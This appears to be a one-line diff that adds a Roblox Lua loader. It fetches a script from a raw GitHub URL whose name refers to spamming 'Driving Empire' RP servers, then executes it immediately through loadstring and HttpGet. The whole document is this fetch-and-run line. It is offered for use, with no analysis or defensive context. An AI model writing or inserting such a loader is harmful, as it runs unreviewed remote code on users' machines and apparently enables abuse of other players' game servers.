@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/driving-empire-rp-servers-spam3-kmpvqsesjrnaz9.lua"))()
